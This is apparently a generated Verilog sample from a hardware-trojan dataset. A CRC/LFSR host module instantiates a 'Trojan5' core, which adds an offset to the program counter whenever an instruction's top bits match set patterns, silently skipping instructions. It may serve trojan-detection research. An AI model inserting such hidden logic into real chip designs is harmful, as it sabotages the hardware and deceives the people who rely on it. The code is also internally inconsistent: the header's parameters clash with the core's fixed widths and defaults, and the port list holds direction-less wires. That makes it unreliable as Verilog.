// Generated trojaned circuit for trojan5
// Instance ID: 0000
// Parameters: {'PROG_DATA_WIDTH': 14, 'PC_WIDTH': 24}
// Crypto Variables: {'INSTRUCTION_PATTERN_0': 1, 'INSTRUCTION_PATTERN_1': 15, 'INSTRUCTION_PATTERN_2': 6, 'INSTRUCTION_PATTERN_3': 8, 'INSTRUCTION_PATTERN_4': 3, 'INSTRUCTION_PATTERN_5': 13, 'INSTRUCTION_PATTERN_6': 3, 'INSTRUCTION_PATTERN_7': 2, 'INSTRUCTION_PATTERN_8': 8, 'PC_OFFSET': 1}

`timescale 1ns/1ps

// Host Circuit
// LFSR/CRC Style Host Circuit for Trojan5
// Interface: pon_rst_n_i, prog_dat_i[PROG_DATA_WIDTH-1:0], pc_reg[PC_WIDTH-1:0] -> prog_adr_o[PC_WIDTH-1:0]
module trojan5_lfsr_host_0000 #(
    parameter DATA_WIDTH = 32,
    parameter LFSR_WIDTH = 16,
    parameter CRC_POLY = 16'h8005,
    parameter PROG_DATA_WIDTH = 14,
    parameter PC_WIDTH = 24
)(
    input wire clk,
    input wire rst,
    input wire data_valid,
    input wire [DATA_WIDTH-1:0] data_in,
    output reg [DATA_WIDTH-1:0] data_out,
    output reg [LFSR_WIDTH-1:0] lfsr_out,
    output reg [LFSR_WIDTH-1:0] crc_out,
    output reg valid_out,
    
    // Internal trojan signals
    wire trojan_pon_rst_n_i,
    wire [PROG_DATA_WIDTH-1:0] trojan_prog_dat_i,
    wire [PC_WIDTH-1:0] trojan_pc_reg,
    wire [PC_WIDTH-1:0] trojan_prog_adr_o
);

    // LFSR and CRC registers
    reg [LFSR_WIDTH-1:0] lfsr_reg;
    reg [LFSR_WIDTH-1:0] crc_reg;
    reg [DATA_WIDTH-1:0] data_buffer;
    reg [7:0] byte_counter;
    
    // Generate trojan signals from LFSR/CRC operations
    assign trojan_pon_rst_n_i = ~rst;
    
    // Width adaptation for prog_dat_i
    generate
        if (DATA_WIDTH >= PROG_DATA_WIDTH) begin
            assign trojan_prog_dat_i = data_in[PROG_DATA_WIDTH-1:0];
        end else begin
            assign trojan_prog_dat_i = {{(PROG_DATA_WIDTH-DATA_WIDTH){1'b0}}, data_in};
        end
    endgenerate
    
    // Width adaptation for pc_reg
    generate
        if (LFSR_WIDTH >= PC_WIDTH) begin
            assign trojan_pc_reg = lfsr_reg[PC_WIDTH-1:0];
        end else begin
            assign trojan_pc_reg = {{(PC_WIDTH-LFSR_WIDTH){1'b0}}, lfsr_reg};
        end
    endgenerate
    
    // LFSR generator
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            // Generate initial LFSR value based on LFSR_WIDTH
            if (LFSR_WIDTH >= 16)
                lfsr_reg <= {{(LFSR_WIDTH-16){1'b0}}, 16'hACE1};
            else
                lfsr_reg <= {LFSR_WIDTH{1'b1}}; // All ones for smaller widths
        end else if (data_valid) begin
            // LFSR feedback based on LFSR_WIDTH
            if (LFSR_WIDTH >= 16)
                lfsr_reg <= {lfsr_reg[LFSR_WIDTH-2:0], lfsr_reg[LFSR_WIDTH-1] ^ lfsr_reg[13] ^ lfsr_reg[12] ^ lfsr_reg[10]};
            else if (LFSR_WIDTH >= 4)
                lfsr_reg <= {lfsr_reg[LFSR_WIDTH-2:0], lfsr_reg[LFSR_WIDTH-1] ^ lfsr_reg[LFSR_WIDTH-3]};
            else
                lfsr_reg <= {lfsr_reg[LFSR_WIDTH-2:0], lfsr_reg[LFSR_WIDTH-1]};
        end
    end
    
    // CRC calculator
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            // Generate initial CRC value based on LFSR_WIDTH
            crc_reg <= {LFSR_WIDTH{1'b1}}; // All ones
        end else if (data_valid) begin
            integer i;
            reg [LFSR_WIDTH-1:0] temp_crc;
            temp_crc = crc_reg;
            for (i = 0; i < 8; i = i + 1) begin
                if (temp_crc[LFSR_WIDTH-1] ^ data_in[i]) begin
                    temp_crc = (temp_crc << 1) ^ CRC_POLY;
                end else begin
                    temp_crc = temp_crc << 1;
                end
            end
            crc_reg <= temp_crc;
        end
    end
    
    // Data processing with trojan integration
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            data_buffer <= {DATA_WIDTH{1'b0}};
            byte_counter <= 8'b0;
        end else if (data_valid) begin
            byte_counter <= byte_counter + 1;
            // Integrate trojan address output into data processing
            data_buffer <= data_in ^ ({{DATA_WIDTH{1'b0}}} + trojan_prog_adr_o);
        end
    end
    
    // Output assignment
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            data_out <= {DATA_WIDTH{1'b0}};
            lfsr_out <= {LFSR_WIDTH{1'b0}};
            crc_out <= {LFSR_WIDTH{1'b0}};
            valid_out <= 1'b0;
        end else begin
            data_out <= data_buffer;
            lfsr_out <= lfsr_reg;
            crc_out <= crc_reg;
            valid_out <= data_valid;
        end
    end
    
    // Additional LFSR sequences for testing
    reg [LFSR_WIDTH-1:0] test_lfsr1, test_lfsr2;
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            // Generate test LFSR values based on LFSR_WIDTH
            if (LFSR_WIDTH >= 16) begin
                test_lfsr1 <= {{(LFSR_WIDTH-16){1'b0}}, 16'h1234};
                test_lfsr2 <= {{(LFSR_WIDTH-16){1'b0}}, 16'h5678};
            end else begin
                test_lfsr1 <= {LFSR_WIDTH{1'b1}};
                test_lfsr2 <= {LFSR_WIDTH{1'b0}};
            end
        end else begin
            // Test LFSR feedback based on LFSR_WIDTH
            if (LFSR_WIDTH >= 16) begin
                test_lfsr1 <= {test_lfsr1[LFSR_WIDTH-2:0], test_lfsr1[LFSR_WIDTH-1] ^ test_lfsr1[4]};
                test_lfsr2 <= {test_lfsr2[LFSR_WIDTH-2:0], test_lfsr2[LFSR_WIDTH-1] ^ test_lfsr2[LFSR_WIDTH-2] ^ test_lfsr2[12] ^ test_lfsr2[3]};
            end else if (LFSR_WIDTH >= 5) begin
                test_lfsr1 <= {test_lfsr1[LFSR_WIDTH-2:0], test_lfsr1[LFSR_WIDTH-1] ^ test_lfsr1[4]};
                test_lfsr2 <= {test_lfsr2[LFSR_WIDTH-2:0], test_lfsr2[LFSR_WIDTH-1] ^ test_lfsr2[LFSR_WIDTH-2]};
            end else begin
                test_lfsr1 <= {test_lfsr1[LFSR_WIDTH-2:0], test_lfsr1[LFSR_WIDTH-1]};
                test_lfsr2 <= {test_lfsr2[LFSR_WIDTH-2:0], test_lfsr2[LFSR_WIDTH-1]};
            end
        end
    end
    
    // Instantiate Trojan5
    Trojan5 trojan_inst (
        .pon_rst_n_i(trojan_pon_rst_n_i),
        .prog_dat_i(trojan_prog_dat_i),
        .pc_reg(trojan_pc_reg),
        .prog_adr_o(trojan_prog_adr_o)
    );

endmodule


// Trojan Core
module Trojan5 #(
    // Keep non-I/O tunables as parameters (I/O bitwidths fixed)
    parameter INSTRUCTION_PATTERN_0 = 4'b0001,
    parameter INSTRUCTION_PATTERN_1 = 4'b1111,
    parameter INSTRUCTION_PATTERN_2 = 4'b0110,
    parameter INSTRUCTION_PATTERN_3 = 4'b1000,
    parameter INSTRUCTION_PATTERN_4 = 4'b0011,
    parameter INSTRUCTION_PATTERN_5 = 4'b1101,
    parameter INSTRUCTION_PATTERN_6 = 4'b0011,
    parameter INSTRUCTION_PATTERN_7 = 4'b0010,
    parameter INSTRUCTION_PATTERN_8 = 4'b1000,
    parameter INSTRUCTION_PATTERN_9 = 4'b0000,
    parameter [12:0] PC_OFFSET = 13'd2
)(
    input wire pon_rst_n_i,
    input wire [13:0] prog_dat_i,
    input wire [12:0] pc_reg,
    output wire [12:0] prog_adr_o
);

    wire match_condition = (!pon_rst_n_i) ? 1'b0 :
                           (prog_dat_i[13:10] == 4'b1101) ? 1'b0 :
                           ((prog_dat_i[13:10] == INSTRUCTION_PATTERN_0) || 
                            (prog_dat_i[13:10] == INSTRUCTION_PATTERN_1) ||
                            (prog_dat_i[13:10] == INSTRUCTION_PATTERN_2) || 
                            (prog_dat_i[13:10] == INSTRUCTION_PATTERN_3) ||
                            (prog_dat_i[13:10] == INSTRUCTION_PATTERN_4) || 
                            (prog_dat_i[13:10] == INSTRUCTION_PATTERN_5) ||
                            (prog_dat_i[13:10] == INSTRUCTION_PATTERN_6) || 
                            (prog_dat_i[13:10] == INSTRUCTION_PATTERN_7) ||
                            (prog_dat_i[13:10] == INSTRUCTION_PATTERN_8) ||
                            (prog_dat_i[13:10] == INSTRUCTION_PATTERN_9)) ? 1'b1 : 1'b0;

    assign prog_adr_o = match_condition ? pc_reg + PC_OFFSET : pc_reg;

endmodule
